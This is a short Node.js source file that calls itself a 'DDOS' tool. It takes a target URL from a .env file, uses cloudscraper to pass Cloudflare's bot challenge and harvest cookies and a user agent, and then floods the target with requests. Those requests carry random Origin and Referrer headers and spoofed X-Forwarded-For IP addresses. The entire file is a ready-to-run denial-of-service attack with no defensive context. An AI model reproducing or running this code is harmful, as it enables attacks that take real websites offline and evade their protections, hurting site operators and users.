import cloudscraper from 'cloudscraper'
import request from 'request'
import randomstring from 'randomstring'
import 'dotenv/config'

const url = process.env.URL
const delay = process.env.DELAY || 60

if (!url) {
  console.log('URL was not found')
  throw new Error('URL was not found. Add value into .env file')
}

console.log(`DDOS url: ${url} delay: ${delay} has been started successfully`)

const generateByte = () => Math.round(Math.random() * 256)

const generateString = () => randomstring.generate({
  length: 10,
  charset: 'abcdefghijklmnopqstuvwxyz0123456789'
})

const generateIP = () => `${generateByte()}.${generateByte()}.${generateByte()}.${generateByte()}`

const handler = setInterval(() => {
  let cookie = ''
  let useragent = ''

  cloudscraper.get(url, (error, response) => {
    if (response) {
      const result = JSON.parse(JSON.stringify(response))
      useragent = result.request.headers['User-Agent']
      cookie = result.request.headers.cookie
    } else {
      console.error('Error occurred', error)
    }

    const instance = generateString()
    const ip = generateIP()

    const options = {
      url,
      headers: {
        'User-Agent': useragent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*!/!*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'cookie': cookie,
        'Origin': `http://${instance}.com`,
        'Referrer': 'http://google.com/' + instance,
        'X-Forwarded-For': ip
      }
    }

    request(options)
  })
})

setTimeout(() =>
    clearInterval(handler),
  delay * 1000
)

process.on('uncaughtException', () => {
  console.warn('Uncaught Exception')
})

process.on('unhandledRejection', () => {
  console.warn('Unhandled Rejection')
})
